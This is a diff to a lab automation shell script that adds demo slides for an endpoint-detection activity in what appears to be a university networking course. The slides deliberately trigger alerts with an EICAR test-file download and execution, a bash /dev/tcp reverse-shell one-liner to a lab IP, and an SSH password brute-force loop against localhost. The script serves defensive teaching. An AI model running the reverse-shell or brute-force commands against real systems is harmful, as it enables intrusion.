@@ -43,7 +43,7 @@ WSTUNNEL=(   rgw wstunnel-server  egw wstunnel-client )
 LAB_DOMAIN="3014ict.chris.grul.me"
 
 # ---- Activity metadata ------------------------------------------------------
-VALID_ACTS=(1 2.1 2.2 3 4.1 4.2)
+VALID_ACTS=(1 2.1 2.2 3 4.1 4.2 5)
 
 typeset -A ACT_NAME
 ACT_NAME=(
@@ -53,6 +53,7 @@ ACT_NAME=(
   3   "Email Server (Postfix + Dovecot)"
   4.1 "Firewalls (nftables)"
   4.2 "VPN (OpenVPN)"
+  5   "Endpoint Detection & Response (Rustinel EDR)"
 )
 
 # Which hosts to walk per activity (trim/expand to suit your time limit).
@@ -64,6 +65,7 @@ ACT_HOSTS=(
   3   "srv igw dkt"
   4.1 "egw rgw srv"
   4.2 "igw egw ovc"
+  5   "ovc"
 )
 
 # ---- Automarker location on each remote ------------------------------------
@@ -244,6 +246,18 @@ build_demos() {
     DEMO_SLIDES=()
     local H="$1"
     case "$ACTIVITY" in
+      # ---- Activity 5: Endpoint Detection & Response (Rustinel EDR on ovc) ---
+      #   ovc runs Rustinel (open-source eBPF EDR). Each demo slide self-runs one
+      #   safe, reversible attack, then prints the resulting ECS NDJSON alerts via
+      #   the pinned `labview-rustinel-alerts` helper (installed NOPASSWD by the
+      #   deploy). Reaching ovc at all is over the VPN (df80::1000). See
+      #   activity5/README.md and activity5/setup-rustinel.sh.
+      5)
+        slide "Rustinel EDR — armed (Part A)" "eBPF agent running; Sigma+YARA+IOC enabled; ECS NDJSON alert sink" text "echo -n 'agent  : '; rustinel --version 2>/dev/null | head -1; echo -n 'service: '; systemctl is-active rustinel 2>/dev/null; echo -n 'enabled: '; systemctl is-enabled rustinel 2>/dev/null; echo; echo '== config (scanners + alert sink) =='; sudo cat /etc/rustinel/config.toml 2>/dev/null | grep -E 'enabled|_path|directory|filename' | sed 's/^/  /'"
+        slide "Demo 1 — EICAR test file (Part B)" "download the standard AV test file, then EXECUTE it so Rustinel's scan-on-process-start fires" text "echo '== download =='; wget -qO ~/eicar.com https://secure.eicar.org/eicar.com.txt && echo 'downloaded ~/eicar.com' || { echo 'wget failed - writing the signature offline'; echo WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo= | base64 -d > ~/eicar.com; }; echo '== execute (queues the IOC/YARA scan) =='; chmod +x ~/eicar.com 2>/dev/null; ~/eicar.com 2>/dev/null; echo executed; sleep 2; echo; echo '== Rustinel alerts =='; sudo /usr/local/sbin/labview-rustinel-alerts 15"
+        slide "Demo 2 — Network intrusion: reverse shell (Part C)" "bash reverse shell via /dev/tcp — fires the bundled 'Linux Reverse Shell via /dev/tcp' Sigma rule on process-start (listener optional)" text "timeout 3 bash -c 'bash -i >& /dev/tcp/10.8.0.1/4444 0>&1' 2>/dev/null; echo attempted; sleep 2; echo '== Rustinel alerts =='; sudo /usr/local/sbin/labview-rustinel-alerts 15"
+        slide "Demo 3 — SSH brute force (Part D)" "8 wrong-password SSH logins to localhost -> custom unix_chkpwd Sigma rule (one alert per attempt; the burst is the signal)" text "if command -v sshpass >/dev/null 2>&1; then for i in 1 2 3 4 5 6 7 8; do sshpass -p wrong\$i ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=3 \$USER@localhost true 2>/dev/null; done; echo '8 failed attempts sent'; else echo 'sshpass not installed / password auth off - run: ./setup-rustinel.sh --enable-ssh-passwords  and  sudo apt-get install -y sshpass'; fi; sleep 2; echo '== Rustinel alerts (brute-force burst) =='; sudo /usr/local/sbin/labview-rustinel-alerts 30"
+        ;;
       # ---- Activity 1: DMZ Networks — trimmed for time: netplan + IP only ----
       # (WireGuard/wstunnel/sysctl/nftables slides removed; the automarker still
       # runs after these and covers the rest.)
